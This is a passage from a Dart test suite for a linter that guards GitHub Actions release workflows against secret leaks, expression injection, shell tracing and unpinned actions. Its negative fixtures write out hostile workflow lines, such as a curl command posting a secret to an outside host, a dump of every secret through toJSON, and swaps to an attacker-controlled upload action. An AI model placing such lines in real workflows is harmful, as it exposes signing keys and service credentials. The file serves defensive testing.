    test('release.yml keeps the structure its criteria depend on', () {
      _assertReleaseShape(
        Workflow.parse(
          '.github/workflows/release.yml',
          readFile('.github/workflows/release.yml'),
        ),
      );
    });

    test(
      'the release-shape rule catches each way the workflow can be gutted',
      () {
        // Every one of these kept the substring version green (#154).
        final text = readFile('.github/workflows/release.yml');
        final mutations = <String, String Function(String)>{
          'gate replaced by a no-op, strings left in a comment': (t) =>
              t.replaceFirst(
                RegExp(r'  gate:\n(.*\n)*?    secrets: inherit\n'),
                '  gate:\n'
                '    # Formerly: uses: ./.github/workflows/ci.yml / secrets: inherit\n'
                '    runs-on: ubuntu-latest\n'
                '    steps:\n'
                '      - name: Do nothing\n'
                "        run: 'true'\n",
              ),
          'permission scan replaced by true': (t) =>
              t.replaceFirst('run: tools/check_aab.sh', "run: 'true'"),
          'certificate check replaced by true': (t) =>
              t.replaceFirst('run: tools/verify_upload_cert.sh', "run: 'true'"),
          'track switched to production': (t) =>
              t.replaceFirst('track: internal', 'track: production'),
          // replaceFirstMapped, not replaceFirst: the plain form inserts the
          // replacement LITERALLY, so `$1` went in as two characters at
          // column 0, broke the block scalar, and the workflow stopped
          // parsing. The battery then saw `expect(wf.problem, isNull)` throw
          // and called it a catch — having proved that malformed YAML fails
          // to parse, not that the rule detects an `if:` on the upload (#172).
          'if: always() on the Play upload': (t) => t.replaceFirstMapped(
            RegExp(r'(      - id: play\n        name: [^\n]*\n)'),
            (m) => '${m[1]}        if: always()\n',
          ),
          'trigger changed to every push to main': (t) => t.replaceFirst(
            RegExp(r"    tags:\n      - 'v\*'\n"),
            '    branches:\n      - main\n',
          ),
          'keystore_check loses -alias': (t) =>
              t.replaceFirst(' \\\n            -alias "\$HS_KEY_ALIAS"', ''),
          // #169: all four of these were green when the assertions were
          // scoped to the `ship` job and matched the action by substring.
          'a second job uploads to production': (t) =>
              '$t'
              '  publish_prod:\n'
              '    needs: ship\n'
              '    runs-on: ubuntu-latest\n'
              '    steps:\n'
              '      - id: play2\n'
              '        uses: r0adkll/upload-google-play@v1\n'
              '        with:\n'
              '          packageName: com.honestarcade.sudoku\n'
              '          releaseFiles: app.aab\n'
              '          track: production\n'
              '          status: completed\n',
          'continue-on-error on the gate job': (t) => t.replaceFirst(
            '  gate:\n',
            '  gate:\n    continue-on-error: true\n',
          ),
          'the upload action is swapped for a fork': (t) => t.replaceFirst(
            'uses: r0adkll/upload-google-play@v1',
            'uses: attacker/upload-google-play@v1',
          ),
          'the upload names another package': (t) => t.replaceFirst(
            'packageName: com.honestarcade.sudoku',
            'packageName: com.attacker.sudoku',
          ),
          'the upload ships an unscanned file': (t) => t.replaceFirst(
            'releaseFiles: build/app/outputs/bundle/release/app-release.aab',
            'releaseFiles: /tmp/other.aab',
          ),
          'shred step deleted': (t) => t.replaceFirst(
            RegExp(
              r'      - id: shred\n'
              r'        name: [^\n]*\n'
              r'        if: always\(\)\n'
              r'        run: [^\n]*\n',
            ),
            '',
          ),
        };
        mutations.forEach((why, mutate) {
          final mutated = mutate(text);
          expect(
            mutated,
            isNot(text),
            reason: 'sanity: "$why" changed nothing',
          );
          // A mutation that breaks the YAML proves nothing: the shape
          // assertion throws on its first line and the battery records a
          // catch it did not earn (#172).
          expect(
            Workflow.parse('release.yml', mutated).problem,
            isNull,
            reason: 'sanity: "$why" produced YAML that does not parse',
          );
          expect(
            () => _assertReleaseShape(Workflow.parse('release.yml', mutated)),
            throwsA(isA<TestFailure>()),
            reason: 'release-shape-negative: "$why" was not caught',
          );
        });
      },
    );

    test('the secret rule refuses any secret reaching a run: body', () {
      // The point of the inversion: the spelling does not matter, because the
      // rule no longer asks what the script does with the value. Every one of
      // these passed the print-detecting version (#131, #141).
      for (final bad in const [
        r'        run: echo ${{ secrets.HS_KEY_PASS }}',
        r'        run: echo "${{ secrets['
            'HS_KEY_PASS'
            '] }}"',
        r'        run: echo "${{ secrets["HS_KEY_PASS"] }}"',
        r'        run: printf "%s" "${{ secrets.PLAY_SERVICE_ACCOUNT_JSON }}"',
        '        run: |\n          cat<<EOF\n'
            '          \${{ secrets.HS_KEY_PASS }}\n          EOF\n',
        r'        run: |'
            '\n'
            r"          cat <<'E-OF'"
            '\n'
            r'          ${{ secrets.HS_KEY_ALIAS }}'
            '\n'
            '          E-OF\n',
        r'        run: |'
            '\n'
            r'          tee /tmp/x <<< "${{ secrets.X }}"'
            '\n',
        r'        run: |'
            '\n'
            r'          curl -d "${{ secrets.X }}" https://x'
            '\n',
        r'        run: |'
            '\n'
            r'          echo "${{ toJSON(secrets) }}"'
            '\n',
        r'        run: |'
            '\n'
            r'          x=${{ secrets.X }}; echo "$x"'
            '\n',
      ]) {
        expect(
          secretsInRunOffenders('bad.yml', _workflow(_runStep(bad))),
          isNotEmpty,
          reason: 'secrets-in-run: accepted `$bad`',
        );
      }
    });

    test('a secret used through env:, and a heredoc writing a file, pass', () {
      // Whole documents, not loose lines. As bare fragments these parsed to a
      // mapping with no `jobs:`, so there were no run scripts and the rule
      // returned empty whatever it did — the claim was never exercised. A
      // fragment carrying ${{ secrets.HS_KEY_PASS }}, ${{ github.ref_name }}
      // AND `set -x` returned zero offenders from all three rules (#177).
      for (final good in const [
        '      - env:\n'
            '          HS_KEY_PASS: \${{ secrets.HS_KEY_PASS }}\n'
            '        run: echo "\$HS_KEY_PASS" > /dev/null\n',
        // The false positive the print-detecting rule introduced: this writes
        // a signing properties file and prints nothing (#141).
        '      - run: |\n'
            '          cat <<EOF > key.properties\n'
            '          storePassword=\$HS_KEYSTORE_PASS\n'
            '          EOF\n',
        '      - run: base64 -d <<< "\$HS_KEYSTORE_B64" > "\$RUNNER_TEMP/k"\n',
      ]) {
        expect(
          secretsInRunOffenders('good.yml', _workflow(good)),
          isEmpty,
          reason: 'secrets-in-run-negative: refused `$good`',
        );
      }
    });

    test('the negative fixtures are real documents that the rules read', () {
      // The guard on the guard: if _workflow() ever stopped producing a
      // parseable workflow, every negative fixture above would go vacuous
      // again and pass by reading nothing. So one fixture is asserted to be
      // CAUGHT, proving the rules see through the wrapper at all (#177).
      final doc = _workflow(
        '      - env:\n'
        '          TAG: \${{ github.ref_name }}\n'
        '        run: echo "\${{ secrets.HS_KEY_PASS }}"\n'
        '          set -x\n',
      );
      expect(Workflow.parse('x.yml', doc).problem, isNull);
      expect(
        secretsInRunOffenders('x.yml', doc),
        isNotEmpty,
        reason: 'the wrapper must produce a document the rules actually read',
      );
    });

    test('untrusted github/inputs values are refused in a run: body', () {
      for (final bad in const [
        r'        run: echo "### Release ${{ github.ref_name }}"',
        r'        run: echo "${{ inputs.to_track }}"',
        '        run: |\n          echo "from \${{ inputs.from_track }}"\n',
        r'        run: echo "${{ github.event.pull_request.title }}"',
      ]) {
        expect(
          untrustedInRunOffenders('bad.yml', _workflow(_runStep(bad))),
          isNotEmpty,
          reason: 'untrusted-in-run: accepted `$bad`',
        );
      }
    });

    test('step outputs and non-run uses of github. are allowed', () {
      // Whole documents, for the reason in the fixture above (#177).
      for (final good in const [
        '      - run: echo "\${{ steps.version.outputs.name }}"\n',
        "      - if: github.event_name == 'pull_request'\n"
            '        run: echo hello\n',
        '      - uses: actions/upload-artifact@v7\n'
            '        with:\n'
            '          name: honest-sudoku-aab-\${{ github.sha }}\n',
        '      - env:\n'
            '          TAG: \${{ github.ref_name }}\n'
            '        run: echo "\$TAG"\n',
      ]) {
        expect(
          untrustedInRunOffenders('good.yml', _workflow(good)),
          isEmpty,
          reason: 'untrusted-in-run-negative: refused `$good`',
        );
      }
    });

    test('every tracing spelling is refused', () {
      for (final bad in const [
        'set -x',
        'set -euxo pipefail',
        'foo; set -ex',
        'set -v',
        'set -o xtrace',
        'set -o verbose',
        // Each of these passed the firstMatch version (#141).
        'set -euo pipefail; set -x',
        'set -e -x',
        'set -o errexit -o xtrace',
        r'set -o "xtrace"',
        'bash -x tools/gate.sh',
        'sh -x script.sh',
      ]) {
        expect(
          shellTraceOffenders('bad.yml', _workflow(_runStep(bad))),
          isNotEmpty,
          reason: 'trace: accepted `$bad`',
        );
      }
      for (final good in const [
        'set -euo pipefail',
        'set -e',
        'settle -x',
        'set -o pipefail',
        'set -o errexit',
        'bash tools/gate.sh',
        'grep -v foo bar',
      ]) {
        expect(
          shellTraceOffenders('good.yml', _workflow(_runStep(good))),
          isEmpty,
          reason: 'trace-negative: refused `$good`',
        );
      }
    });

    test('a tracing shell is refused at workflow, job and step level', () {
      // Only the step level was checked, so a two-character change to the
      // workflow-level `shell: bash` that every file here already has traced
      // every step in the job holding all five secrets (#168).
      const header =
          'name: F\non: workflow_dispatch\n'
          'permissions:\n  contents: read\nconcurrency: f\n';
      const job = 'jobs:\n  a:\n    steps:\n      - run: echo hi\n';

      for (final entry in const {
        'workflow level':
            '${header}defaults:\n  run:\n    shell: bash -x\n$job',
        'job level':
            '${header}jobs:\n  a:\n    defaults:\n      run:\n'
            '        shell: bash -x\n    steps:\n      - run: echo hi\n',
        'step level':
            '$header${'jobs:\n  a:\n    steps:\n'
                '      - shell: bash -x\n        run: echo hi\n'}',
      }.entries) {
        expect(
          shellTraceOffenders('bad.yml', entry.value),
          isNotEmpty,
          reason: 'trace: a tracing shell at ${entry.key} was accepted',
        );
      }

      for (final entry in const {
        'workflow level': '${header}defaults:\n  run:\n    shell: bash\n$job',
        'job level':
            '${header}jobs:\n  a:\n    defaults:\n      run:\n'
            '        shell: bash\n    steps:\n      - run: echo hi\n',
      }.entries) {
        expect(
          shellTraceOffenders('good.yml', entry.value),
          isEmpty,
          reason: 'trace-negative: a plain shell at ${entry.key} was refused',
        );
      }
    });

    test('a shell: value or SHELLOPTS that traces is refused', () {
      // Read structurally now, so a quoted or flow-style value is seen too.
      for (final bad in const [
        '      - shell: bash -x\n        run: echo hi\n',
        '      - shell: "bash -ex"\n        run: echo hi\n',
        '      - shell: bash -v\n        run: echo hi\n',
        "      - {shell: 'bash -x', run: echo hi}\n",
        '      - run: |\n          export SHELLOPTS=xtrace\n',
      ]) {
        expect(
          shellTraceOffenders('bad.yml', _workflow(bad)),
          isNotEmpty,
          reason: 'trace: accepted `$bad`',
        );
      }
      for (final good in const [
        '      - shell: bash\n        run: echo hi\n',
        '      - shell: pwsh\n        run: echo hi\n',
        '      - shell: bash -e\n        run: echo hi\n',
      ]) {
        expect(
          shellTraceOffenders('good.yml', _workflow(good)),
          isEmpty,
          reason: 'trace-negative: refused `$good`',
        );
      }
    });

    test('a secret is seen through every YAML step shape', () {
      // All five parse to a step whose `run` holds the secret, and all five
      // were invisible to the line scan this replaced (#156).
      const shapes = <String, String>{
        'flow mapping': '      - {run: "echo \${{ secrets.A }}"}\n',
        'quoted key': '      - "run": echo \${{ secrets.B }}\n',
        'anchor before the block indicator':
            '      - run: &s |\n          echo \${{ secrets.C }}\n',
        'alias smuggling':
            '      - name: &a "echo \${{ secrets.D }}"\n'
            '        run: *a\n',
        'multi-line quoted scalar':
            '      - run: "echo\n          \${{ secrets.E }}"\n',
      };
      shapes.forEach((why, step) {
        expect(
          secretsInRunOffenders('bad.yml', _workflow(step)),
          isNotEmpty,
          reason: 'shape: $why was invisible',
        );
      });
    });

    test('a secret is seen through every expression spelling', () {
      // Actions contexts and functions are case-insensitive, and `join` over
      // the `*` filter dumps every secret the job can see (#157).
      for (final expression in const [
        r'${{ secrets.HS_KEY_PASS }}',
        r'${{secrets.HS_KEY_PASS}}',
        r'${{ SECRETS.HS_KEY_PASS }}',
        r'${{ Secrets.HS_KEY_PASS }}',
        r"${{ secrets['HS_KEY_PASS'] }}",
        r'${{ secrets["HS_KEY_PASS"] }}',
        r'${{ toJSON(secrets) }}',
        r'${{ toJson(secrets) }}',
        r'${{ toJSON (secrets) }}',
        r"${{ join(secrets.*, ',') }}",
        r"${{ format('{0}', secrets.HS_KEY_PASS) }}",
        r'${{ fromJSON(toJSON(secrets)).HS_KEY_PASS }}',
      ]) {
        expect(
          secretsInRunOffenders(
            'bad.yml',
            _workflow(_runStep('echo "$expression"')),
          ),
          isNotEmpty,
          reason: 'spelling: accepted `$expression`',
        );
      }
    });

    test('an untrusted value is seen through every expression spelling', () {
      for (final expression in const [
        r'${{ github.ref_name }}',
        r'${{ GITHUB.ref_name }}',
        r"${{ github['ref_name'] }}",
        r'${{ github["ref_name"] }}',
        r"${{ inputs['to_track'] }}",
        r"${{ env['TAG'] }}",
        r'${{ toJSON(github) }}',
        r'${{ fromJSON(github.event.inputs.x) }}',
        r"${{ format('{0}', github.ref_name) }}",
        r'${{ (github.ref_name) }}',
        r'${{ needs.a.outputs.y }}',
        r'${{ matrix.tag }}',
      ]) {
        expect(
          untrustedInRunOffenders(
            'bad.yml',
            _workflow(_runStep('echo "$expression"')),
          ),
          isNotEmpty,
          reason: 'spelling: accepted `$expression`',
        );
      }
    });

    test('prose that merely mentions a secret is allowed', () {
      // The rule used to match the literal text `secrets.`, so a filename or a
      // warning in a message was refused (#157).
      for (final script in const [
        'ls docs/secrets.md',
        'echo "never log secrets.MY"',
        'echo hi # never echo secrets.FOO',
        r'echo "$HS_KEY_PASS"',
        r'cat <<EOF > key.properties'
            '\n'
            r'storePassword=$HS_KEYSTORE_PASS'
            '\nEOF',
      ]) {
        expect(
          secretsInRunOffenders('good.yml', _workflow(_runStep(script))),
          isEmpty,
          reason: 'prose: refused `$script`',
        );
      }
    });

    test(
      'a step that puts run: on the dash line does not swallow its siblings',
      () {
        // `keyIndent` came from the column of the `-`, so `env:` after a
        // dash-line `run:` was read as part of the script and flagged — the
        // exact remediation the rule prescribes (#156).
        const step =
            '      - run: |\n'
            '          echo "\$K"\n'
            '        env:\n'
            '          K: \${{ secrets.HS_KEY_PASS }}\n';
        expect(
          secretsInRunOffenders('good.yml', _workflow(step)),
          isEmpty,
          reason: 'dash-line: refused a secret passed through step env:',
        );
      },
    );

    test('a document that parses but is not a usable workflow is refused', () {
      // parse() set `problem` only when the YAML would not load. Each of
      // these loaded, produced zero jobs or steps, and yielded zero
      // offenders from every rule — so a structurally wrong workflow scanned
      // as clean. The header promises the opposite: a guard that cannot read
      // its subject must fail, not pass quietly (#177).
      const unusable = <String, String>{
        'jobs: as a list': 'name: X\non: push\njobs:\n  - gate\n',
        'jobs: with no jobs': 'name: X\non: push\njobs: {}\n',
        'steps: as a map':
            'name: X\non: push\njobs:\n  a:\n    steps:\n      run: echo hi\n',
        'a step with neither run nor uses':
            'name: X\non: push\njobs:\n  a:\n    steps:\n      - name: x\n',
        'run: as a number':
            'name: X\non: push\njobs:\n  a:\n    steps:\n      - run: 42\n',
        'run: as a list':
            'name: X\non: push\njobs:\n  a:\n    steps:\n'
            '      - run:\n          - echo hi\n',
        'valid YAML that is not a workflow': 'hello: world\n',
      };
      unusable.forEach((why, text) {
        final wf = Workflow.parse('x.yml', text);
        expect(
          wf.problem,
          isNotNull,
          reason: 'unusable: "$why" was accepted as a readable workflow',
        );
        // And every rule must report it, rather than returning empty.
        for (final rule in <List<WorkflowOffender> Function(String, String)>[
          unpinnedUses,
          permissionOffenders,
          concurrencyOffenders,
        ]) {
          expect(
            rule('x.yml', text),
            isNotEmpty,
            reason: 'unusable: "$why" scanned clean',
          );
        }
      });
    });

    test('an Error escaping the loader is an offender, not a crash', () {
      // The handler exists because StackOverflowError is an Error, not an
      // Exception, so `on YamlException` misses it and it escapes parse().
      //
      // The test that guarded it asserted nothing. It nested 6000 deep, and
      // I had measured that depth with `dart run` — `flutter test` has a
      // different stack size, so under the real runner 6000 raises a
      // YamlException and the test passed through the wrong branch.
      // Deleting the handler left the suite green (#191).
      //
      // Raising the depth is not the fix: it was lowered from 60000 because
      // that much stack pressure failed an unrelated file running
      // concurrently. So the handler is exercised directly instead, by
      // throwing the Error from inside the load.
      expect(
        () => Workflow.parse(
          'x.yml',
          'a: b\n',
          load: (_) => throw StackOverflowError(),
        ),
        returnsNormally,
        reason:
            'parse-error: a StackOverflowError from the loader escaped as a '
            'crash. It is an Error, not an Exception, so `on YamlException` '
            'does not catch it',
      );
      // The SAME method the guards call, with its loader replaced — not a
      // sibling that `parse` might or might not delegate to (#194).
      final wf = Workflow.parse(
        'x.yml',
        'a: b\n',
        load: (_) => throw StackOverflowError(),
      );
      expect(
        wf.problem,
        contains('too deep'),
        reason: 'parse-error: the offender must name what went wrong',
      );

      // And the real thing still behaves — on a document that genuinely
      // OVERFLOWS, not merely one that fails to scan.
      //
      // This line used to be `'a:\n    ${'[' * 6000}'`, an UNCLOSED sequence.
      // Measured at 1000, 3000, 6000, 12000 and 20000 it raises
      // `YamlException: Expected node content` at every depth and never
      // overflows, because an unclosed sequence fails in the scanner before
      // recursion. It exercised the YamlException branch under a name about
      // overflow — vacuous with respect to its own purpose (#217).
      //
      // Balanced brackets at 32000 do overflow; that is measured in the
      // execution test's comment.
      expect(
        Workflow.parse('x.yml', 'jobs: ${'[' * 32000}${']' * 32000}\n').problem,
        contains('too deep'),
        reason:
            'parse-error: a genuine overflow must be reported as an offender, '
            'not merely any unparseable document',
      );
    });

    test('a workflow that cannot be parsed is refused, not skipped', () {
      const broken = 'name: Broken\non: [push\njobs:\n  a:\n';
      for (final offenders in [
        secretsInRunOffenders('broken.yml', broken),
        untrustedInRunOffenders('broken.yml', broken),
        shellTraceOffenders('broken.yml', broken),
      ]) {
        expect(
          offenders,
          isNotEmpty,
          reason: 'unparseable: a guard that cannot read its subject must fail',
        );
      }
    });

    test('tracing is seen through quotes, paths and + flag groups', () {
      for (final script in const [
        'set -x',
        'set -euo pipefail; set -x',
        'set -e -x',
        'set -v',
        'set -o xtrace',
        'set -o errexit -o xtrace',
        'set +e -x',
        'set +u -o xtrace',
        '"set -x; ./b.sh"',
        "'set -x'",
        '/bin/bash -x tools/gate.sh',
        '/usr/bin/bash -x x.sh',
        'bash --verbose x.sh',
        'bash -o xtrace x.sh',
        'exec bash -x x.sh',
      ]) {
        expect(
          shellTraceOffenders('bad.yml', _workflow(_runStep(script))),
          isNotEmpty,
          reason: 'trace: accepted `$script`',
        );
      }
      for (final script in const [
        'set -euo pipefail',
        'set -o pipefail',
        'settle -x',
        'set -- -x',
        'grep -v foo bar',
        'curl -sv https://example.invalid',
        'bash tools/gate.sh',
      ]) {
        expect(
          shellTraceOffenders('good.yml', _workflow(_runStep(script))),
          isEmpty,
          reason: 'trace-negative: refused `$script`',
        );
      }
    });

    test('a dependabot file missing an ecosystem is refused', () {
      const onlyActions =
          'version: 2\nupdates:\n  - package-ecosystem: github-actions\n';
      expect(dependabotOffenders(onlyActions).join(), contains('pub'));
      expect(dependabotOffenders(null).join(), contains('missing'));
    });

    test('a pin below the pubspec minimum is refused', () {
      expect(
        flutterPinOffenders(
          '{"flutter": "3.46.0"}',
          'environment:\n  sdk: ^3.13.4\n  flutter: ">=3.47.0"\n',
        ).join(),
        contains('below the minimum'),
      );
      expect(
        flutterPinOffenders(
          '{"flutter": "3.47.5"}',
          'environment:\n  sdk: ^3.13.4\n  flutter: ">=3.47.0"\n',
        ),
        isEmpty,
      );
      expect(
        flutterPinOffenders(
          '{"flutter": "3.47.5"}',
          'environment:\n  sdk: ^3.13.4\n',
        ).join(),
        contains('no `flutter:'),
      );
    });
    test('a uses: with no ref is refused', () {
      final offenders = unpinnedUses(
        'bad.yml',
        _workflow('      - uses: actions/checkout\n'),
      );
      expect(offenders, hasLength(1));
      expect(offenders.single.message, contains('no @ref'));
    });
    test('a trailing @ with nothing after it is refused', () {
      expect(
        unpinnedUses('bad.yml', _workflow('      - uses: actions/checkout@\n')),
        hasLength(1),
      );
    });
    for (final ref in floatingRefs) {
      test('a ref of `$ref` is refused', () {
        final offenders = unpinnedUses(
          'bad.yml',
          _workflow('      - uses: actions/checkout@$ref\n'),
        );
        expect(offenders, hasLength(1));
        expect(offenders.single.message, contains('moving ref'));
      });
    }

    test('a ref that merely contains a floating word is allowed', () {
      // `v2-main-branch` is a real tag shape; only the whole ref counts.
      expect(
        unpinnedUses(
          'good.yml',
          _workflow('      - uses: a/b@v2-main-branch\n'),
        ),
        isEmpty,
      );
      expect(
        unpinnedUses(
          'good.yml',
          _workflow('      - uses: a/b@latest-stable\n'),
        ),
        isEmpty,
      );
    });

    test('an unpinned action written as a flow mapping is refused', () {
      // The line scan matched `^\s*-?\s*uses:`, so `- {uses: x}` returned
      // zero offenders — the exact bypass class #154 was filed for, still
      // open in this rule because it was never converted (#175).
      final offenders = unpinnedUses(
        'bad.yml',
        _workflow('      - {uses: attacker/action}\n'),
      );
      expect(
        offenders,
        hasLength(1),
        reason: 'flow-style `uses:` must be seen',
      );
      expect(offenders.single.message, contains('no @ref'));
    });

    test('an unpinned action whose value is on the next line is refused', () {
      final offenders = unpinnedUses(
        'bad.yml',
        _workflow('      - uses:\n          attacker/action\n'),
      );
      expect(offenders, hasLength(1));
    });

    test("a job's own uses: is subject to the pin rule", () {
      // WorkflowJob.uses was parsed and never consulted by this rule.
      final offenders = unpinnedUses(
        'bad.yml',
        'name: X\n'
            'on: workflow_dispatch\n'
            'permissions:\n  contents: read\n'
            'concurrency: x\n'
            'jobs:\n'
            '  a:\n'
            '    uses: attacker/wf/.github/workflows/x.yml\n'
            '    secrets: inherit\n',
      );
      expect(offenders, hasLength(1));
      expect(offenders.single.message, contains('job `a`'));
    });

    test('a folded or anchored uses: is not a false positive', () {
      // Both were flagged as missing a ref by the line scan, erring safe but
      // wrongly — the parser resolves them to their value (#175). The
      // anchored half was fixed and untested, in a test whose name claims
      // it (#196).
      expect(
        unpinnedUses(
          'good.yml',
          _workflow('      - uses: >-\n          actions/checkout@v7\n'),
        ),
        isEmpty,
        reason: 'folded',
      );
      expect(
        unpinnedUses(
          'good.yml',
          'name: X\non: push\npermissions:\n  contents: read\n'
              'concurrency: x\n'
              'x: &pin actions/checkout@v7\n'
              'jobs:\n  a:\n    steps:\n      - uses: *pin\n',
        ),
        isEmpty,
        reason: 'anchored: an alias resolves to its pinned value',
      );
      // And the complement, so the anchor case cannot pass by being unread.
      expect(
        unpinnedUses(
          'bad.yml',
          'name: X\non: push\npermissions:\n  contents: read\n'
              'concurrency: x\n'
              'x: &bad attacker/action\n'
              'jobs:\n  a:\n    steps:\n      - uses: *bad\n',
        ),
        isNotEmpty,
        reason: 'anchored: an alias to an unpinned action must be refused',
      );
    });

    test('a pinned ref, a local action and a container are all allowed', () {
      const good =
          '      - uses: actions/checkout@v7\n'
          '      - uses: "subosito/flutter-action@v2"\n'
          "      - uses: 'ludeeus/action-shellcheck@2.0.0'\n"
          '      - uses: ./.github/workflows/ci.yml\n'
          '      - uses: docker://alpine:3.20\n'
          '      - uses: actions/checkout@v7  # trailing comment\n'
          '      # - uses: actions/checkout\n';
      expect(
        unpinnedUses('good.yml', _workflow(good)),
        isEmpty,
        reason: 'pins-negative: refused a legitimate uses: line',
      );
    });
    test('a workflow without top-level permissions is refused', () {
      const bad =
          'name: X\non: push\nconcurrency: x\n'
          'jobs:\n  a:\n    permissions:\n      contents: read\n'
          '    steps:\n      - run: \'true\'\n';
      final offenders = permissionOffenders('bad.yml', bad);
      expect(offenders, hasLength(1));
      expect(offenders.single.message, contains('no top-level'));
    });
    test('write-all is refused at any level', () {
      const bad =
          'name: X\non: push\nconcurrency: x\n'
          'permissions: read-all\n'
          'jobs:\n  a:\n    permissions: write-all\n'
          '    steps:\n      - run: \'true\'\n';
      final offenders = permissionOffenders('bad.yml', bad);
      expect(offenders, hasLength(1));
      expect(offenders.single.message, contains('write-all'));
    });
    test('write-all is refused when quoted', () {
      // `permissions: 'write-all'` returned zero offenders: the line scan
      // matched the bare word only, and GitHub honours both (#175).
      const bad =
          'name: X\non: push\nconcurrency: x\n'
          "permissions: 'write-all'\n"
          'jobs:\n  a:\n    steps:\n      - run: \'true\'\n';
      final offenders = permissionOffenders('bad.yml', bad);
      expect(offenders, hasLength(1));
      expect(offenders.single.message, contains('write-all'));
    });
    test('read-all at the top level is allowed', () {
      expect(
        permissionOffenders(
          'good.yml',
          'name: X\non: push\nconcurrency: x\npermissions: read-all\n'
              'jobs:\n  a:\n    steps:\n      - run: \'true\'\n',
        ),
        isEmpty,
      );
    });
    test('a workflow without concurrency is refused', () {
      expect(
        concurrencyOffenders(
          'bad.yml',
          'name: X\non: push\npermissions:\n  contents: read\n'
              'jobs:\n  a:\n    steps:\n      - run: \'true\'\n',
        ),
        hasLength(1),
      );
    });
    test('concurrency in either form is allowed', () {
      expect(
        concurrencyOffenders(
          'good.yml',
          'name: X\non: push\npermissions:\n  contents: read\n'
              'concurrency: play-release\n'
              'jobs:\n  a:\n    steps:\n      - run: \'true\'\n',
        ),
        isEmpty,
      );
      expect(
        concurrencyOffenders(
          'good.yml',
          'name: X\non: push\npermissions:\n  contents: read\n'
              'concurrency:\n  group: ci\n  cancel-in-progress: true\n'
              'jobs:\n  a:\n    steps:\n      - run: \'true\'\n',
        ),
        isEmpty,
      );
    });
    test('no composite action exists that the rules cannot read', () {
      // The rules parse `jobs:` — a composite action's steps live under
      // `runs.steps`, so `.github/actions/**/action.yml` is scanned by
      // nothing: not for pins, not for secrets in run:, not for tracing.
      // None exist today, so this is a tripwire rather than a scan: adding
      // one fails here, and whoever adds it extends the rules first (#180).
      final dir = Directory('${repoRoot.path}/.github/actions');
      final found = dir.existsSync()
          ? dir
                .listSync(recursive: true)
                .whereType<File>()
                .where((f) => RegExp(r'action\.ya?ml$').hasMatch(f.path))
                .map((f) => f.path.replaceFirst('${repoRoot.path}/', ''))
                .toList()
          : <String>[];
      expect(
        found,
        isEmpty,
        reason:
            'composite actions are not covered by unpinnedUses, '
            'secretsInRunOffenders or shellTraceOffenders, which read '
            '`jobs:` and not `runs.steps`. Extend them before adding $found',
      );
    });

    test('only release.yml may upload to Play', () {
      // The rule applied to every workflow, not only the one it was written
      // for. ci.yml is `workflow_call`ed by release.yml with
      // `secrets: inherit`, so an upload step added there runs with
      // PLAY_SERVICE_ACCOUNT_JSON on a tag push (#182).
      for (final path in _workflowFiles()) {
        final wf = Workflow.parse(path, readFile(path));
        expect(wf.problem, isNull, reason: '$path: ${wf.problem}');
        if (path.endsWith('release.yml')) {
          expect(_playUploads(wf), [
            'ship.play',
          ], reason: 'upload-scope: release.yml must upload once, from ship');
        } else {
          _expectNoPlayUpload(wf);
        }
        _assertRunnerAndEnvironment(wf);
      }
    });

    test('an offender names its line in every scalar style', () {
      // #188 fixed the block style and broke the single-line one, because
      // `bodyLine = line + 1` was unconditional and the issue's premise
      // ("every block-scalar run: … and that is all of them") was false.
      // Nine single-line `run:` values live in these workflows. All four
      // styles are asserted now, so neither direction can drift (#188, #195).
      const head =
          'name: X\n' // 1
          'on: push\n' // 2
          'permissions:\n' // 3
          '  contents: read\n' // 4
          'concurrency: x\n' // 5
          'jobs:\n' // 6
          '  a:\n' // 7
          '    steps:\n'; // 8
      final cases = <String, ({String yaml, int line})>{
        'block scalar': (
          yaml: '$head      - run: |\n          echo one\n          set -x\n',
          line: 11,
        ),
        'folded scalar': (
          yaml: '$head      - run: >-\n          set -x\n',
          line: 10,
        ),
        'plain single line': (yaml: '$head      - run: set -x\n', line: 9),
        'quoted single line': (yaml: '$head      - run: "set -x"\n', line: 9),
      };
      cases.forEach((style, c) {
        final offenders = shellTraceOffenders('x.yml', c.yaml);
        expect(offenders, hasLength(1), reason: 'offender-line: $style');
        expect(
          offenders.single.line,
          c.line,
          reason:
              'offender-line: $style — the offence is on line ${c.line} and '
              'the offender says ${offenders.single.line}',
        );
      });
    });

    test('a job that is not a mapping is refused, not skipped', () {
      // `if (jobMap is! YamlMap) continue;` dropped it silently with
      // problem == null, so all three rules returned zero offenders for a
      // file holding one — #177's class in one more spelling (#188).
      const doc =
          'name: X\non: push\npermissions:\n  contents: read\n'
          'concurrency: x\n'
          'jobs:\n'
          '  a: nope\n'
          '  b:\n    steps:\n      - run: echo hi\n';
      final wf = Workflow.parse('x.yml', doc);
      expect(wf.problem, isNotNull, reason: 'a scalar job scanned as clean');
      expect(wf.problem, contains('not mappings'));
      for (final rule in <List<WorkflowOffender> Function(String, String)>[
        unpinnedUses,
        permissionOffenders,
        concurrencyOffenders,
      ]) {
        expect(rule('x.yml', doc), isNotEmpty);
      }
    });

    test('write-all is refused whatever its case', () {
      // Compared case-sensitively where the rest of this file is
      // deliberately case-insensitive (#188).
      for (final spelling in const [
        'write-all',
        'WRITE-ALL',
        'Write-All',
        "'write-all'",
      ]) {
        final doc =
            'name: X\non: push\nconcurrency: x\n'
            'permissions: $spelling\n'
            "jobs:\n  a:\n    steps:\n      - run: 'true'\n";
        expect(
          permissionOffenders('x.yml', doc),
          isNotEmpty,
          reason: 'write-all-case: `$spelling` was accepted',
        );
      }
    });

    test('a rate-limited read is told apart from a real refusal', () {
      // The recorded shape of GitHub's answer when an anonymous caller has
      // spent its 60 requests. Kept as a fixture so the branch that skips on
      // it is exercised without waiting an hour for a real one (#219).
      const rateLimited =
          '{"message":"API rate limit exceeded for 1.2.3.4. (But here is the '
          'good news: Authenticated requests get a higher rate limit.)",'
          '"documentation_url":"https://docs.github.com/rest"}';
      expect(_isRateLimited('403', rateLimited), isTrue);

      // And the complement: a 403 that is NOT rate limiting must not be
      // waved through as a skip, or a genuinely refused read reads as
      // "nothing to see here".
      expect(
        _isRateLimited('403', '{"message":"Resource not accessible"}'),
        isFalse,
        reason: 'a permissions 403 is a failure, not a skip',
      );
      expect(_isRateLimited('200', rateLimited), isFalse);
      expect(_isRateLimited('404', rateLimited), isFalse);
    });

    test('the required checks are still bound, and are the check-run names', () {
      // The one part of the merge gate with no guard on it: the ruleset
      // lives in GitHub config, so #187 is real today and silently
      // reversible tomorrow — the same failure mode as the issue itself, a
      // gate that exists but does not bind (#196).
      //
      // Read WITHOUT authentication. The previous version used `gh` and
      // said in three places that this needs an admin-scoped token CI does
